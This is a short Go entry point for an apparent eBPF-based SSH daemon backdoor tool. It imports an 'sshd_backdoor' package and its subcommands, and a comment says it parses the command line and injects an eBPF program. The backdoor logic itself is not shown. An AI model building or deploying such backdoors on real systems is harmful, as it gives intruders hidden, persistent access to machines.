package main

import (
	"ebpf_common/cmd/sshd_backdoor"
	_ "ebpf_common/cmd/sshd_backdoor/subCommand"
)

func main() {
	// Prase command line and inject ebpf program in file system.
	_ = sshd_backdoor.RootCmd.Execute()
}
